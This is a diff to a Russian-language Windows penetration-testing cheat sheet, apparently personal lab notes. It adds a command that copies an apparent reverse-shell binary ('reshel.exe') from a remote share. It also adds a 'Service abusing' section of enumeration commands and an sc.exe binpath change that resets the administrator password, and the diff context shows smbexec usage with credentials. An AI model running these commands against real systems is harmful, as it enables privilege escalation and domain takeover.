@@ -58,7 +58,9 @@ azman.msc
 
 # подключить сетевой диск
 
-net use * \\ta-d.local\NETLOGON - подключить сетевой диск
+    net use * \\ta-d.local\NETLOGON - подключить сетевой диск
+
+    xcopy \\10.10.10.10\files\reshel.exe .
 
 # Поиск описания пользователей груп и политик и добавление (Cбор информации в домене)
 
@@ -401,6 +403,42 @@ python smbexec.py ignite/administrator:Ignite@987@192.168.1.105
 
 
 # Сервисы Windows
+
+Get-Service
+
+sc query state=all
+
+get-wmiobject win32_service
+
+Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'
+
+cd HKLM:\system\currentcontrolset\services> set-location 'hklm:\system\currentcontrolset\services'    ----- перейтив в ветку где все службы
+
+get-childiem .    ---- получить список служб
+
+Get-ChildItem . | select name    --- получить все имена служб
+
+# Service abusing
+
+net stop UniFiVideoService
+
+get-childitem UniFiVideoService
+
+get-childitem . | Where-Object {$_.Name -like '*UniFiVideoService'}
+
+cd 'HKLM:\system\currentcontrolset\services'> get-childitem . | where-object {$_.Name -like '*MTsensor*'}    ----- определить название службы
+
+stop-service 'Ubiquiti UniFi Video'
+
+start-service 'Ubiquiti UniFi Video'
+
+sc.exe stop browser
+
+sc.exe start browser
+
+sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
+
+
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
 
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс 
@@ -409,31 +447,6 @@ sc.exe qc daclsvc - используется для получения инфо�
 
 sc.exe query daclsvc - информация о состянии службы (старт, стоп)
 
-services
-
-# Service abusing
-
-sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
-
-sc.exe stop browser
-
-sc.exe start browser
-        
-net stop browser
-
-
-        ----через повер шелл
-        
-cd HKLM:\system\currentcontrolset\services> set-location 'hklm:\system\currentcontrolset\services'    ----- перейтив в ветку где все службы
-
-get-childiem .    ---- получить список служб
-
-Get-ChildItem . | select name    --- получить все имена служб
-
-PS HKLM:\system\currentcontrolset\services> get-childitem . | where-object {$_.N
-ame -like '*MTsensor*'}    ----- определить название службы 
-
-Stop-Service 'MTSensor'
 
 
 
